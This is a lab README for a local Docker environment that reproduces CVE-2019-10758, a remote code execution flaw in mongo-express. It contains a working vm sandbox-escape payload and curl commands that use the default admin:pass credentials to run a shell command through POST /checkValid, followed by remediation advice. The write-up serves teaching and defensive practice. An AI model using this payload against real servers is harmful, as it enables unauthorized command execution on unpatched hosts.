# Mongo-Express Server-Side JavaScript Execution RCE (CVE-2019-10758)

## Overview

[mongo-express](https://github.com/mongo-express/mongo-express) is a web-based administrative interface for MongoDB written in Node.js and Express. In versions prior to 0.54.0, endpoints utilizing the `toBSON` parser method (`lib/bson.js`) execute user-controlled input within Node.js's built-in `vm.runInNewContext` without adequate sandboxing.

Because the Node.js `vm` module does not create a secure execution boundary, an authenticated user (or an attacker abusing the default credentials `admin:pass`) can escape the context through prototype chain traversal (`this.constructor.constructor("return process")()`), gain access to the host's `process.mainModule.require`, load `child_process`, and execute arbitrary operating system commands via `POST /checkValid`.

- **Service Access**: [http://localhost:8140/](http://localhost:8140/)
- **Default Credentials**: `admin:pass`
- **Docker Shortcut**: `./lab start mongo-express-rce`
- **Container Names**:
  - Web: `cyberlab_02_mongo_express_web` (`vulhub/mongo-express:0.53.0`)
  - Database: `cyberlab_02_mongo_express_db` (`mongo:3.4`)
- **Port Mapping**: `8140:8081` (host:container)
- **RAM Footprint**: ~700MB total (~350MB web, ~350MB database)

---

## Vulnerability Details

- **Vulnerability**: Remote Code Execution (RCE) via `toBSON` Deserialization / Evaluation
- **CVE Identifier**: [CVE-2019-10758](https://nvd.nist.gov/vuln/detail/CVE-2019-10758)
- **Snyk Advisory**: [SNYK-JS-MONGOEXPRESS-473215](https://security.snyk.io/vuln/SNYK-JS-MONGOEXPRESS-473215)
- **Vulnerable Component**: `mongo-express < 0.54.0` (`lib/bson.js` `toBSON` method)
- **Trigger Endpoint**: `POST /checkValid` (parameter: `document`)

In `mongo-express`, `bson.toBSON(str)` utilizes `vm.runInNewContext` to evaluate dynamic JavaScript input into BSON objects. By passing a crafted payload in the `document` parameter:

```javascript
document = this.constructor
  .constructor("return process")()
  .mainModule.require("child_process")
  .execSync("command");
```

The application executes the code in the host Node.js environment synchronously.

---

## Exploitation Walkthrough

### 1. Verify Web UI Access and Authentication

Check unauthenticated request (returns HTTP 401 Unauthorized):

```bash
curl -i http://localhost:8140/
```

Check authenticated request with default credentials `admin:pass` (returns HTTP 200 OK):

```bash
curl -u admin:pass -i http://localhost:8140/
```

### 2. Trigger Remote Code Execution via `POST /checkValid`

Submit a URL-encoded payload to `/checkValid` executing an arbitrary command (e.g. creating `/tmp/pwned_mongo_express`):

```bash
curl -i -X POST 'http://localhost:8140/checkValid' \
  -u admin:pass \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("touch /tmp/pwned_mongo_express")'
```

Expected response includes `Valid`:

```http
HTTP/1.1 200 OK
...
Valid
```

### 3. Verify File Creation Inside Container

Verify that `/tmp/pwned_mongo_express` was created inside the web container:

```bash
docker exec -it cyberlab_02_mongo_express_web ls -la /tmp/pwned_mongo_express
```

---

## Defensive Remediation & Hardening

1. **Upgrade mongo-express**: Upgrade to version 0.54.0 or newer where `toBSON` replaces unsafe dynamic evaluation with `mongodb-extended-json` parsing.
2. **Access Control**: Enforce strong, non-default credentials and restrict access to MongoDB and Mongo-Express behind a secure network perimeter or reverse proxy.
3. **Container Sandboxing**: Run Node.js applications with non-root privileges, read-only root filesystems, and drop unnecessary capabilities (`--cap-drop=ALL`).

---

## Technical References & Advisories

- [Vulhub Mongo-Express CVE-2019-10758 Environment](https://github.com/vulhub/vulhub/tree/master/mongo-express/CVE-2019-10758)
- [Snyk Security Advisory SNYK-JS-MONGOEXPRESS-473215](https://security.snyk.io/vuln/SNYK-JS-MONGOEXPRESS-473215)
- [NVD NIST CVE-2019-10758 Advisory](https://nvd.nist.gov/vuln/detail/CVE-2019-10758)
- [NoSQLi Tutorial Using PortSwigger (with labs)](https://www.youtube.com/watch?v=5SmDLBQxmXw)
